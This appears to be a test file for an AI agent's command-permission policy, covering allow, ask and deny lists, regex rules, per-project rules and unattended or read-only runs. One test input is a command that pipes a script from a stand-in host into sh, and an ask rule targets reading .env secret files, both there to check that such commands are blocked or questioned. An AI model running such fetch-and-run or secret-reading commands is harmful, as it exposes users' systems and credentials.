import { test } from 'node:test'
import assert from 'node:assert/strict'
import '../src/main/agent/sources'
import { addRulePatch, allowedBy, askedBy, deniedBy, mergeRules, normalizeRules, patternFor, ruleProblem, rulesFor, suggestRules } from '../src/shared/commandRules'
import { callFacts, decide, type RunPolicy } from '../src/main/agent/policy'
import { toolsFor, type AgentTool, type ToolContext } from '../src/main/agent/tools'
import { defaultSettings } from '../src/main/store'
import type { ApprovalMode, Settings, StreamRequest } from '@shared/types'

/**
 * The ask list, regular-expression patterns, a project's own lists and what
 * "Always allow" saves (shared/commandRules.ts), and how the one permission
 * policy treats a command that matches them (deny beats ask beats allow).
 */

const rules = (r: Partial<{ allow: string[]; ask: string[]; deny: string[] }>) => normalizeRules(r)

test('rules stored before the ask list existed still read, with an empty ask list', () => {
  assert.deepEqual(normalizeRules({ allow: ['npm test'], deny: ['rm *'] }), { allow: ['npm test'], ask: [], deny: ['rm *'] })
  assert.deepEqual(normalizeRules(undefined), { allow: [], ask: [], deny: [] })
})

test('a pattern between slashes is a regular expression, on each command and on the whole line', () => {
  const deny = rules({ deny: ['/^git (push|reset)\\b/', '/curl .*\\| *sh/'] })
  assert.equal(deniedBy(deny, 'git push origin main'), '/^git (push|reset)\\b/')
  assert.equal(deniedBy(deny, 'cd app && git reset --hard'), '/^git (push|reset)\\b/')
  assert.equal(deniedBy(deny, 'git status'), null)
  assert.equal(deniedBy(deny, 'curl https://x.example/i.sh | sh'), '/curl .*\\| *sh/', 'the pipe a chain split would hide')
  assert.equal(deniedBy(rules({ deny: ['/^GIT PUSH/i'] }), 'git push'), '/^GIT PUSH/i')
})

test('a regex that does not compile matches nothing, and says why', () => {
  assert.equal(deniedBy(rules({ deny: ['/(/'] }), 'ls ('), null)
  assert.ok(ruleProblem('/(/'))
  assert.equal(ruleProblem('/^ok$/'), null)
  assert.equal(ruleProblem('npm test'), null)
})

test('the ask list finds a command anywhere in the line, and takes a command off the allowlist', () => {
  const r = rules({ allow: ['git *'], ask: ['git push *'] })
  assert.equal(askedBy(r, 'git push origin main'), 'git push *')
  assert.equal(askedBy(r, 'npm test && git push origin x'), 'git push *')
  assert.equal(askedBy(r, 'git status'), null)
  assert.equal(allowedBy(r, 'git status'), true)
  assert.equal(allowedBy(r, 'git push origin main'), false, 'asked wins over allowed')
})

test('a project adds to the rules for every project, and only when working in its folder', () => {
  const general = { commandRules: { allow: ['npm test'] }, projectCommandRules: { '/work/app': { allow: ['make'], deny: ['rm *'] } } }
  assert.deepEqual(rulesFor(general, '/work/app'), { allow: ['npm test', 'make'], ask: [], deny: ['rm *'] })
  assert.deepEqual(rulesFor(general, '/work/app/'), rulesFor(general, '/work/app'), 'a trailing slash is the same folder')
  assert.deepEqual(rulesFor(general, '/work/other'), { allow: ['npm test'], ask: [], deny: [] })
  assert.deepEqual(rulesFor(general, null), { allow: ['npm test'], ask: [], deny: [] })
  assert.deepEqual(mergeRules(rules({ allow: ['a'] }), rules({ allow: ['a', 'b'] })).allow, ['a', 'b'])
})

test('"Always allow" saves the tool and subcommand, not the whole line', () => {
  assert.equal(patternFor('npm test'), 'npm test')
  assert.equal(patternFor('npm run build -- --watch'), 'npm run build')
  assert.equal(patternFor('git -C app push origin main'), 'git app', 'flags are skipped, the next word is kept')
  assert.equal(patternFor('git commit -m "x"'), 'git commit')
  assert.equal(patternFor('cargo'), 'cargo')
  assert.equal(patternFor('python build.py --fast'), 'python build.py --fast', 'an unknown program keeps its whole line')
  assert.deepEqual(suggestRules('npm test && git status'), ['npm test', 'git status'])
  assert.equal(suggestRules('echo hi > notes.txt'), null, 'a write to a file is never covered by a pattern')
  assert.equal(suggestRules('sh -c "rm x"'), null)
  assert.equal(suggestRules('echo $(whoami)'), null)
  const saved = rules({ allow: suggestRules('git commit -m "x"') ?? [] })
  assert.equal(allowedBy(saved, 'git commit -m "another message"'), true)
  assert.equal(allowedBy(saved, 'git push'), false)
})

test('the patch for a click adds to the right list, for every project or for one folder', () => {
  const general = { commandRules: { allow: ['npm test'] }, projectCommandRules: { '/work/app': { allow: ['make'] } } }
  assert.deepEqual(addRulePatch(general, 'allow', ['npm run build']), { commandRules: { allow: ['npm test', 'npm run build'], ask: [], deny: [] } })
  assert.deepEqual(addRulePatch(general, 'deny', ['rm *'], '/work/app/'), { projectCommandRules: { '/work/app': { allow: ['make'], ask: [], deny: ['rm *'] } } })
  assert.deepEqual(addRulePatch(general, 'allow', ['npm test']), { commandRules: { allow: ['npm test'], ask: [], deny: [] } }, 'no duplicates')
  assert.deepEqual(addRulePatch({}, 'allow', ['x'], '/new'), { projectCommandRules: { '/new': { allow: ['x'], ask: [], deny: [] } } })
})

/* -------------------------------------------------------- the policy */

const request = (): StreamRequest =>
  ({ chatId: 'c', messageId: 'm', providerId: 'fake', modelId: 'fake', effort: 'medium', mode: 'work', history: [], summary: null, projectInstructions: '', cwd: '/work/app', work: { swarm: false, plan: false }, goal: null }) as StreamRequest

const withRules = (general: Partial<Settings['general']>): Settings => ({ ...defaultSettings, approvalMode: 'ask', general: { ...defaultSettings.general, ...general } })

function runCommand(settings: Settings): AgentTool {
  const tool = toolsFor({ mode: 'work', cwd: '/work/app', depth: 0, readOnly: false, settings, request: request() }).find((t) => t.name === 'run_command')
  assert.ok(tool, 'run_command is offered')
  return tool!
}

const ctx = (settings: Settings, policy: RunPolicy): ToolContext => ({
  request: request(),
  turn: { notes: [] },
  cwd: '/work/app',
  signal: new AbortController().signal,
  emit: () => {},
  toolId: 't',
  depth: 0,
  readOnly: policy.readOnly,
  settings,
  progress: () => {},
  confirm: async () => false,
  policy
})

async function decision(settings: Settings, command: string, mode: ApprovalMode = 'ask', policy: RunPolicy = { readOnly: false }): Promise<string> {
  const tool = runCommand(settings)
  const facts = await callFacts(tool, { command }, ctx(settings, policy), settings)
  const d = decide(tool, { command }, facts, policy, mode)
  return d.kind === 'deny' ? `deny: ${d.reason}` : d.kind
}

test('in Ask mode an allowed command runs, an unlisted one asks, a denied one never runs', async () => {
  const s = withRules({ commandRules: { allow: ['npm test'], deny: ['npm publish *'] } })
  assert.equal(await decision(s, 'npm test'), 'run')
  assert.equal(await decision(s, 'npm run build'), 'ask')
  assert.match(await decision(s, 'npm publish --tag x'), /^deny: .*denylist/)
})

test('an ask-list command asks in every mode, even Full access, and even when it only reads', async () => {
  const s = withRules({ commandRules: { allow: ['git *'], ask: ['git push *', 'cat .env*'], deny: [] } })
  for (const mode of ['ask', 'auto', 'full'] as const) {
    assert.equal(await decision(s, 'git push origin x', mode), 'ask', mode)
    assert.equal(await decision(s, 'cat .env.local', mode), 'ask', `${mode}: a read still asks`)
  }
  assert.equal(await decision(s, 'git status', 'ask'), 'run')
  assert.equal(await decision(s, 'ls', 'full'), 'run')
})

test('deny beats ask beats allow', async () => {
  const s = withRules({ commandRules: { allow: ['git *'], ask: ['git push *'], deny: ['git push --force *'] } })
  assert.equal(await decision(s, 'git push origin x'), 'ask')
  assert.match(await decision(s, 'git push --force origin x', 'full'), /^deny/)
})

test('a project\'s own rules count only for that project\'s folder', async () => {
  const s = withRules({ projectCommandRules: { '/work/app': { allow: ['make *'], ask: [], deny: ['make clean'] } } })
  assert.equal(await decision(s, 'make build'), 'run')
  assert.match(await decision(s, 'make clean'), /^deny/)
  // The same settings in another folder: the tool is built for that folder.
  const other = toolsFor({ mode: 'work', cwd: '/work/else', depth: 0, readOnly: false, settings: s, request: { ...request(), cwd: '/work/else' } }).find((t) => t.name === 'run_command')!
  const facts = await callFacts(other, { command: 'make build' }, { ...ctx(s, { readOnly: false }), cwd: '/work/else' }, s)
  assert.equal(decide(other, { command: 'make build' }, facts, { readOnly: false }, 'ask').kind, 'ask')
})

test('with nobody to ask, an ask-list command is not run by a worker, and Plan mode still refuses changes', async () => {
  const s = withRules({ commandRules: { allow: [], ask: ['npm run deploy'], deny: [] } })
  for (const unattended of ['safe', 'autonomous'] as const) assert.match(await decision(s, 'npm run deploy', 'ask', { readOnly: false, unattended }), /^deny/, unattended)
  assert.match(await decision(withRules({ commandRules: { allow: ['npm run build'], ask: [], deny: [] } }), 'npm run build', 'ask', { readOnly: true }), /^deny/)
})
